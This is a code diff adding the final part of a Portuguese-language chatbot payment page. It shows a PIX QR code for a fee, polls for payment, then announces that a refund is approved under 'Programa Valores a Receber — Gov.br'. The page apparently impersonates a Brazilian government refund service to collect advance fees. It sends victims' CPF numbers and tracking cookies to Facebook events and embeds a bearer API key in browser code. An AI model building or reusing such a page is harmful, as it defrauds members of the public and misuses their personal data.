+      const qrImg=order.qrCodeUrl||(order.qrCodeBase64?`data:image/png;base64,${order.qrCodeBase64}`:'')||'';
+      const extId=order.publicId||order.txId;
+      const row=document.createElement('div');
+      row.className='message-row bot fadeIn';
+      row.innerHTML=`
+        <div class="avatar"></div>
+        <div class="qr-card">
+          ${qrImg?`<img src="${qrImg}" alt="QR Code PIX">`:''}
+          <div class="copy-box">
+            <div class="copy-label"><i class="fas fa-copy" style="margin-right:4px;"></i>Copia e Cola PIX</div>
+            <div class="copy-code" id="pix-code-txt">${pixCode}</div>
+          </div>
+          <button class="btn-copy" id="btn-copiar-pix"><i class="fas fa-copy"></i> Copiar código PIX</button>
+          <div style="background:#eff6ff;border:1.5px solid #93c5fd;border-radius:10px;padding:10px;margin-bottom:10px;font-size:13px;color:#1e40af;text-align:left;">
+            <strong>📱 Após pagar, volte para esta página!</strong><br>A confirmação é automática assim que detectarmos o pagamento.
+          </div>
+          <div style="font-size:12px;color:#999;line-height:1.6;"><i class="fas fa-clock" style="margin-right:4px;"></i>Código expira em <strong>15 minutos</strong>. Após pagar, ${VALOR_TOTAL} é liberado automaticamente.</div>
+        </div>`;
+      chatContent.appendChild(row); scrollDown();
+
+      document.getElementById('btn-copiar-pix').addEventListener('click',function(){
+        navigator.clipboard.writeText(pixCode).then(()=>{
+          this.innerHTML='<i class="fas fa-check"></i> Copiado!'; this.classList.add('copied');
+          setTimeout(()=>{this.innerHTML='<i class="fas fa-copy"></i> Copiar código PIX';this.classList.remove('copied');},2500);
+        }).catch(()=>{
+          const el=document.getElementById('pix-code-txt');
+          if(el){const r=document.createRange();r.selectNode(el);window.getSelection().removeAllRanges();window.getSelection().addRange(r);}
+        });
+      });
+
+      if(extId) iniciarPolling(extId,chavePix);
+      document.addEventListener('visibilitychange',async()=>{
+        if(document.visibilityState==='visible'&&extId){
+          try{const r=await fetch(`/api/hp-webhook?order_id=${extId}`);const d=await r.json();if(d.paid===true){clearInterval(pollingRef);await onPaid(chavePix);}}catch(e){}
+        }
+      });
+    }
+
+    function iniciarPolling(extId,chavePix){
+      pollingRef=setInterval(async()=>{
+        try{
+          const r=await fetch(`${GP_API_BASE}/deposito/status?txId=${encodeURIComponent(extId)}`,{headers:{'Authorization':'Bearer '+GP_API_KEY}});
+          const d=await r.json();
+          if(d&&isPaidStatus(d.status)){clearInterval(pollingRef);await onPaid(chavePix);return;}
+          const wr=await fetch(`/api/hp-webhook?order_id=${extId}`);
+          const wd=await wr.json();
+          if(wd.paid===true){clearInterval(pollingRef);await onPaid(chavePix);return;}
+        }catch(e){}
+      },3000);
+    }
+
+    async function onPaid(chavePix){
+      const eventId=`purchase-bets-${Date.now()}`;
+      if(typeof fbq!=='undefined') fbq('track','Purchase',{value:TAXA_NUM,currency:'BRL',content_ids:['taxa-bets'],content_type:'product'},{eventID:eventId});
+      fetch('/api/fb-event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({event_name:'Purchase',value:TAXA_NUM,currency:'BRL',cpf:userCPF,client_user_agent:navigator.userAgent,event_source_url:window.location.href,fbc:document.cookie.match(/_fbc=([^;]+)/)?.[1]||'',fbp:document.cookie.match(/_fbp=([^;]+)/)?.[1]||'',event_id:eventId})}).catch(()=>{});
+      await botMsg('🎉 <strong>Pagamento confirmado!</strong> Processando seu resgate...', 800);
+      await botMsg(`✅ <strong>Resgate aprovado!</strong><br><br>O valor de <strong>${VALOR_TOTAL}</strong> será creditado na chave PIX <strong>${chavePix}</strong> em até <strong>2 horas úteis</strong>.<br><br>Obrigado por utilizar o Programa Valores a Receber — Gov.br!`, 2200);
+    }
+
+    startChat();
+  </script>
+</body>
+</html>
